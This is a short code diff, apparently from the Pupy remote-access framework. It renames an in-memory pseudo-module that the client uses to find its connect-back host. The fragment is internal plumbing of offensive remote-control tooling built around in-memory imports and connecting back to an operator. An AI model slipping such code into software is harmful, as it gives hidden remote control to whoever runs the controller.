@@ -71,9 +71,9 @@ def get_next_wait(attempt):
 
 def add_pseudo_pupy_module(HOST):
 	if not "pupy" in sys.modules:
-		mod = imp.new_module("pupyimporter")
+		mod = imp.new_module("pupy")
 		mod.__name__="pupy"
-		mod.__file__="<memimport>\\\\pupyimporter"
+		mod.__file__="<memimport>\\\\pupy"
 		mod.__package__="pupy"
 		sys.modules["pupy"]=mod
 		mod.get_connect_back_host=(lambda : HOST)
